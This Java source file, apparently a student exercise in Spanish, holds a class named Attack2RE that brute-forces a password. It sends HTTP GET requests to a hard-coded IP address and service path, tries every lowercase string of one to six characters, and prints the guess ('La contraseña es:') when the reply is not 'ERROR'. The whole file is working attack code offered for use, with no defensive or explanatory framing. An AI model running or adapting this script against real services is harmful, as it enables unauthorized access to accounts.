package get;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

public class Attack2RE {
	public String At() throws ClientProtocolException, IOException {
		String abc = "abcdefghijklmnñopqrstuvwxyz"; 
		String resultado = "";
		boolean validar=false;
		char alf1[];
        char alf2[];
        char alf3[];
        char alf4[];
        char alf5[];
        char alf6[];
        alf1 = abc.toCharArray();
        alf2 = abc.toCharArray();
        alf3 = abc.toCharArray();
        alf4 = abc.toCharArray();
        alf5 = abc.toCharArray();
        alf6 = abc.toCharArray();
        
        for(int i=0; i<alf1.length; i++){
            String prueba=Character.toString(alf1[i]);
            HttpClient client = new DefaultHttpClient();
            HttpGet request = new HttpGet("http://35.161.4.173:8080/tst1/rs/clase1/metodoget?version=user"+"&Data="+prueba);
    		HttpResponse response = client.execute(request);
    		BufferedReader rd = new BufferedReader (new InputStreamReader(response.getEntity().getContent()));
    		String line = "";
    		while ((line = rd.readLine()) != null) {
    			if(!line.equals("ERROR")){
    				resultado=prueba;
    				System.out.println("La contraseña es: "+prueba);
                    System.out.println(line);
                    validar=true;
                }
     		}
        }
        if(validar==false){
            	for(int i=0; i<alf1.length; i++){
                    for(int j=0; j<alf2.length; j++){
                        String prueba=Character.toString(alf1[i])+Character.toString(alf2[j]);
                        HttpClient client = new DefaultHttpClient();
                        HttpGet request = new HttpGet("http://35.161.4.173:8080/tst1/rs/clase1/metodoget?version=user"+"&Data="+prueba);
                		HttpResponse response = client.execute(request);
                		BufferedReader rd = new BufferedReader (new InputStreamReader(response.getEntity().getContent()));
                		String line = "";
                		while ((line = rd.readLine()) != null) {
                			if(!line.equals("ERROR")){
                				resultado=prueba;
                				System.out.println("La contraseña es: "+prueba);
                                System.out.println(line);
                                validar=true;
                			}                				
                 		}
                	}
                }
        }
        if(validar==false){
                for(int i=0; i<alf1.length; i++){
                    for(int j=0; j<alf2.length; j++){
                        for(int k=0; k<alf3.length; k++){
                            String prueba=Character.toString(alf1[i])+Character.toString(alf2[j])+Character.toString(alf3[k]);
                            HttpClient client = new DefaultHttpClient();
                            HttpGet request = new HttpGet("http://35.161.4.173:8080/tst1/rs/clase1/metodoget?version=user"+"&Data="+prueba);
	                		HttpResponse response = client.execute(request);
	                		BufferedReader rd = new BufferedReader (new InputStreamReader(response.getEntity().getContent()));
	                		String line = "";
	                		while ((line = rd.readLine()) != null) {
	                			if(!line.equals("ERROR")){
	                				resultado=prueba;
	                				System.out.println("La contraseña es: "+prueba);
	                                System.out.println(line);
	                                validar=true;
	                            }
                     		}
                        }
                    }
                }
            }
        	if(validar==false){
                for(int i=0; i<alf1.length; i++){
                    for(int j=0; j<alf2.length; j++){
                        for(int k=0; k<alf3.length; k++){
                            for(int l=0; l<alf4.length; l++){
                                String prueba=Character.toString(alf1[i])+Character.toString(alf2[j])+Character.toString(alf3[k])+Character.toString(alf4[l]);
                                HttpClient client = new DefaultHttpClient();
                                HttpGet request = new HttpGet("http://35.161.4.173:8080/tst1/rs/clase1/metodoget?version=user"+"&Data="+prueba);
    	                		HttpResponse response = client.execute(request);
    	                		BufferedReader rd = new BufferedReader (new InputStreamReader(response.getEntity().getContent()));
    	                		String line = "";
                                while ((line = rd.readLine()) != null) {
                                	if(!line.equals("ERROR")){
    	                				resultado=prueba;
    	                				System.out.println("La contraseña es: "+prueba);
    	                                System.out.println(line);
    	                                validar=true;
    	                            }
            	          		}
                            }
                        }
                    }    
                }        
            }
        	if(validar==false){
                for(int i=0; i<alf1.length; i++){
                    for(int j=0; j<alf2.length; j++){
                        for(int k=0; k<alf3.length; k++){
                            for(int l=0; l<alf4.length; l++){
                                for(int m=0; m<alf5.length; m++){
                                    String prueba=Character.toString(alf1[i])+Character.toString(alf2[j])+Character.toString(alf3[k])+Character.toString(alf4[l])+Character.toString(alf5[m]);
                                    HttpClient client = new DefaultHttpClient();
                                    HttpGet request = new HttpGet("http://35.161.4.173:8080/tst1/rs/clase1/metodoget?version=user"+"&Data="+prueba);
        	                		HttpResponse response = client.execute(request);
        	                		BufferedReader rd = new BufferedReader (new InputStreamReader(response.getEntity().getContent()));
        	                		String line = "";
                                    while ((line = rd.readLine()) != null) {
    	                	   			if(!line.equals("ERROR")){
        	                				resultado=prueba;
        	                				System.out.println("La contraseña es: "+prueba);
        	                                System.out.println(line);
        	                                validar=true;
        	                            }
           	                		}
                                }    
                            }
                        }
                    }    
                }        
            }
        	if(validar==false){
                for(int i=0; i<alf1.length; i++){
                    for(int j=0; j<alf2.length; j++){
                        for(int k=0; k<alf3.length; k++){
                            for(int l=0; l<alf4.length; l++){
                                for(int m=0; m<alf5.length; m++){
                                    for(int n=0; n<alf6.length; n++){
                                        String prueba=Character.toString(alf1[i])+Character.toString(alf2[j])+Character.toString(alf3[k])+Character.toString(alf4[l])+Character.toString(alf5[m])+Character.toString(alf6[n]);
                                        HttpClient client = new DefaultHttpClient();
                                        HttpGet request = new HttpGet("http://35.161.4.173:8080/tst1/rs/clase1/metodoget?version=user"+"&Data="+prueba);
            	                		HttpResponse response = client.execute(request);
            	                		BufferedReader rd = new BufferedReader (new InputStreamReader(response.getEntity().getContent()));
            	                		String line = "";
                                        while ((line = rd.readLine()) != null) {
	           	                			if(!line.equals("ERROR")){
            	                				resultado=prueba;
            	                				System.out.println("La contraseña es: "+prueba);
            	                                System.out.println(line);
            	                                validar=true;
            	                            }
               	                		}
                                    }    
                                }    
                            }
                        }
                    }    
                }        
            }
    return resultado;
	}
}